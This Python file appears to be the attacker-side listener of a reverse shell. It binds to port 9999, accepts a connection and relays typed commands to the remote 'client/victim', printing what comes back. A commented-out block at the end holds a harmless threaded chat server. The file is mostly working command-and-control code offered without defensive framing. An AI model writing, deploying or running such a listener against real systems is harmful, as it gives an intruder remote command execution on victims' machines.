import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = socket.gethostbyname(socket.gethostname())
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()



# import socket
# import threading
# import time

# PORT=4444
# HEADER=64
# FORMAT="utf-8"
# DISCONNECT="!DISCONNECT"
# SERVER=socket.gethostbyname(socket.gethostname())
# print(SERVER)
# server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# server.bind((SERVER,PORT))
# def handle_client(conn,addr):
#     print(f"[New Connection]{addr}connected.")
#     connected=True
#     while connected:
#         msg_length=conn.recv(HEADER).decode(FORMAT)
#         if msg_length:
#             msg_length=int(msg_length)
#             msg=conn.recv(msg_length).decode(FORMAT)
#             if msg==DISCONNECT:
#                 connected=False
#             print(f"[{addr}]{msg}")
# def start():
#     server.listen()
#     print(f"[LISTENING]Server on {SERVER}")
#     while True:
#         conn,addr=server.accept()
#         thread=threading.Thread(target=handle_client,args=(conn,addr))
#         thread.start()
#         print(f"[Active connections]{threading.activeCount()-1}")
# print("server is starting")
# start()